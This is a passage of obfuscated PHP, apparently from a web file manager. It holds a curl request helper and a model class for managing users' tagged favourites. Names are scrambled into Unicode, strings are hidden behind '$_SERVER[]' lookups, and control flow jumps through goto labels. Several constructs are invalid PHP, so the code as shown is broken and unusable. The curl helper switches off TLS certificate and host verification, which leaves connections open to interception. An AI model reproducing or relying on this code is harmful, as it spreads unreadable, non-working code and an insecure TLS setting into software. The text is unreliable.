curl_setopt($cӤ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($cӤ, CURLOPT_SSL_VERIFYHOST, !1); $cچº = curl_exec($cӤ); goto eѮ; a₎: $cӤ = curl_init($F); curl_setopt($cӤ, CURLOPT_CUSTOMREQUEST, $D); curl_setopt($cӤ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto A; d: $C͏ =& $_SERVER[]; $eᗇ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($C͏[1746], $C͏[50]); goto Aݩ; e: } } goto c㪬; E: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($F擆) { $E杻 =& $_SERVER[]; return array($E杻[2450] => array(USER_ID, $E杻[2506])); } protected function listData() { $Dƍ =& $_SERVER[]; $C͜ = array($Dƍ[1397] => USER_ID, $Dƍ[432] => array($Dƍ[2507], 0)); $Cم = $Dƍ[2508]; $c⊨ = $Dƍ[2509]; $dêԋ = $this->field($Cم)->where($C͜)->order($c⊨)->select(); return $dêԋ ? $dêԋ : array(); } protected function listByTag($dӣː،) { } protected function addToTag($e틪, $c) { $Eޗ =& $_SERVER[]; if (!Model($Eޗ[2276])->listData($c) || !Model($Eޗ[738])->pathInfo($e틪)) { return !1; } $Fϑь = array($Eޗ[1397] => USER_ID, $Eޗ[432] => $c, $Eޗ[383] => $e틪, $Eޗ[384] => $Eޗ[378], $Eޗ[382] => $Eޗ[33], $Eޗ[2072] => 0); if ($this->where($Fϑь)->find()) { return !1; } return $this->add($Fϑь); } protected function removeFromTag($F؎ϡݜ, $a͏) { $Bׯ =& $_SERVER[]; if (!Model($Bׯ[2276])->listData($a͏)) { return !1; } if (is_array($F؎ϡݜ)) { $F؎ϡݜ = array($Bׯ[7], $F؎ϡݜ); } $cݳ = array($Bׯ[1397] => USER_ID, $Bׯ[432] => $a͏, $Bׯ[384] => $Bׯ[378], $Bׯ[383] => $F؎ϡݜ); return $this->where($cݳ)->delete(); } protected function removeByTag($Dͨ񟆠) { $A좕 =& $_SERVER[]; if (!$Dͨ񟆠) { return !1; } $A̟ = array($A좕[1397] => USER_ID, $A좕[432] => $Dͨ񟆠); return $this->where($A̟)->delete(); } protected function removeBySource($c̄) { $cϔ =& $_SERVER[]; $E = array($cϔ[1397] => USER_ID, $cϔ[383] => $c̄, $cϔ[432] => array($cϔ[914], 0)); return $this->where($E)->delete(); } }